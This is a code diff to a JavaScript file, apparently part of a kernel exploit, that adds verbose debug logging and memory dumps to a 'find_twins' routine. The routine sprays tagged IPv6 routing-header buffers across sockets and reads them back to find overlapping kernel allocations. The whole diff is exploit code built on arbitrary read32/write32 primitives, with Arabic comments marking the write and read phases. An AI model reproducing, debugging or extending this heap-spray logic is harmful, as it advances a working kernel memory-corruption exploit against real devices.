@@ -296,9 +296,9 @@ function get_rthdr(sd, buf, max_len) {
 var real_get_rthdr = get_rthdr;
 
 get_rthdr = function(sock, buf, len) {
-  //log("[RTHDR-GET] BEFORE sock=" + sock + " max_len=" + len);
+  log("[RTHDR-GET] BEFORE sock=" + sock + " max_len=" + len);
   var ret = real_get_rthdr(sock, buf, len);
-  //log("[RTHDR-GET] AFTER ret=" + ret);
+  log("[RTHDR-GET] AFTER ret=" + ret);
   return ret;
 };
 
@@ -851,6 +851,14 @@ find_twins = function () {
 };
 
 
+function dumpBuf(ptr, size, label) {
+  var out = label + " @ " + hex(ptr) + " (size=" + size + "): ";
+  for (var k = 0; k < size; k += 4) {
+    out += hex(read32(ptr.add(k))) + " ";
+  }
+  log(out);
+}
+
 function find_twins() {
   var count = 0;
   var val, i, j;
@@ -860,11 +868,15 @@ function find_twins() {
   twins[1] = -1;
 
   var spray_add = spray_rthdr.add(0x04);
-  var leak_add = leak_rthdr.add(0x04);
+  var leak_add  = leak_rthdr.add(0x04);
 
   while (count < MAX_ROUNDS_TWIN) {
 
-    // مراقبة حالة الذاكرة (منطق عام)
+    log("\n==============================");
+    log("=== [TWINS-ROUND] #" + count + " ===");
+    log("==============================\n");
+
+    // مراقبة الذاكرة
     if (typeof debugging !== 'undefined' &&
         debugging.info &&
         debugging.info.memory &&
@@ -882,48 +894,73 @@ function find_twins() {
     }
 
 
-    // المرحلة الأولى: كتابة
+    //
+    // المرحلة الأولى: الكتابة
+    //
     for (i = 0; i < ipv6_socks.length; i++) {
       if (ipv6_socks[i].eq(BigInt_Error)) continue;
 
-      write32(spray_add, RTHDR_TAG | i);
-      read32(spray_add); // memory barrier (منطق عام)
+      var tag = RTHDR_TAG | i;
+
+      log("[WRITE] sock=" + i +
+          " tag=" + hex(tag) +
+          " spray_base=" + hex(spray_rthdr) +
+          " spray_ptr=" + hex(spray_add));
+
+      dumpBuf(spray_rthdr, 0x20, "[BEFORE-WRITE] spray_rthdr");
+
+      write32(spray_add, tag);
+      read32(spray_add);
+
+      dumpBuf(spray_rthdr, 0x20, "[AFTER-WRITE] spray_rthdr");
 
       set_rthdr(ipv6_socks[i], spray_rthdr, spray_rthdr_len);
     }
 
 
-    // المرحلة الثانية: قراءة + قرار
+    //
+    // المرحلة الثانية: القراءة + القرار
+    //
     for (i = 0; i < ipv6_socks.length; i++) {
       if (ipv6_socks[i].eq(BigInt_Error)) continue;
 
+      log("\n[READ] sock=" + i +
+          " leak_base=" + hex(leak_rthdr) +
+          " leak_ptr=" + hex(leak_add));
+
+      dumpBuf(leak_rthdr, 0x20, "[BEFORE-GET] leak_rthdr");
+
       write32(leak_add, 0);
+
       get_rthdr(ipv6_socks[i], leak_rthdr, 8);
+
+      dumpBuf(leak_rthdr, 0x20, "[AFTER-GET] leak_rthdr");
 
       val = read32(leak_add);
       j = val & 0xFFFF;
 
-      // لوج منطقي قبل القرار
-      log("[TWINS-CHECK] i=" + i + " val=" + val + " j=" + j);
+      log("[PARSE] raw_val=" + hex(val) +
+          " tag=" + hex(val & 0xFFFF0000) +
+          " idx=" + j);
 
-      // الشرط العام
       var condition =
         ((val & 0xFFFF0000) === RTHDR_TAG) &&
         (i !== j) &&
         (j >= 0) &&
         (j < ipv6_socks.length);
 
-      // لوج القرار
-      log("[TWINS-CONDITION] i=" + i + " j=" + j + " cond=" + condition);
+      log("[CHECK] i=" + i +
+          " j=" + j +
+          " cond=" + condition);
 
       if (condition) {
-        log("[TWINS-FOUND] i=" + i + " j=" + j);
+        log("\n🔥🔥🔥 [TWINS-FOUND] i=" + i + " j=" + j + " 🔥🔥🔥\n");
         twins[0] = i;
         twins[1] = j;
         return true;
       }
 
-      log("[TWINS-NOPE] i=" + i + " j=" + j);
+      log("[NO-MATCH] i=" + i + " j=" + j);
     }
 
     count++;
